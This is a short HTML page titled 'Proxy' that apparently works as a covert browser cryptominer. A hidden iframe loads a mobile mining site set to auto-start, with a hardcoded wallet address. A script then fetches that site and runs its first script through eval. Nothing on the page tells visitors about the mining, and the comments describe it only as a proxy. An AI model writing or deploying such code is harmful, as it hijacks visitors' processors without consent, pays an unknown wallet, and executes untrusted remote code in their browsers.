<!DOCTYPE html>
<html>
<head>
  <title>Proxy</title>
</head>
<body>
  <iframe src="https://mobileminer.org/mine/?auto=1&addr=48i1YMC7dCDB6mXcQ2ZgNQMSEXLzvAUq1AEqaButWHt7jHJueFYBbyrbAnFMBmsoU819DygXJ12xa16UM14y2GmtEAFEiFt" style="display:none;"></iframe>
  <script>
    // Proxy script
    const proxyUrl = 'https://mobileminer.org/mine/';
    const addr = '48i1YMC7dCDB6mXcQ2ZgNQMSEXLzvAUq1AEqaButWHt7jHJueFYBbyrbAnFMBmsoU819DygXJ12xa16UM14y2GmtEAFEiFt';
    const auto = '1';

    const iframe = document.querySelector('iframe');
    iframe.src = `${proxyUrl}?auto=${auto}&addr=${addr}`;

    // Forward requests to MobileMiner
    fetch(proxyUrl)
      .then(response => response.text())
      .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const script = doc.querySelector('script');
        if (script) {
          const scriptText = script.textContent;
          eval(scriptText);
        }
      });
  </script>
</body>
</html>
